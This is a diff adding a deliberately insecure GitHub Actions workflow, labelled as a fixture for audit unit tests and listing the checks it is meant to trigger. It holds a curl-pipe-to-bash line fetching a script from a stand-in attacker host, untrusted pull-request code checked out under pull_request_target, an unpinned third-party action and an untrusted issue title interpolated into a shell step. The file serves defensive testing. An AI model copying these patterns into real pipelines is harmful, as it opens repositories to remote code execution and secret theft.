@@ -1,0 +1,24 @@
+# Intentionally insecure workflow used for audit unit tests.
+# Triggers checks: 1 (missing_permissions), 3 (unpinned_action_tag),
+# 4 (action_on_branch), 5 (unvetted_action_owner), 6 (inline_package_install),
+# 7 (curl_pipe_shell), 8 (pull_request_target), 9 (untrusted_context_in_run),
+# 10 (deprecated_runner).
+name: Insecure Example
+
+on:
+  pull_request_target:
+    types: [opened]
+
+jobs:
+  build:
+    runs-on: ubuntu-20.04
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - uses: some-random-user/cool-action@main
+      - name: install stuff
+        run: |
+          npm install left-pad
+          curl https://evil.example.com/install.sh | bash
+          echo "${{ github.event.issue.title }}"
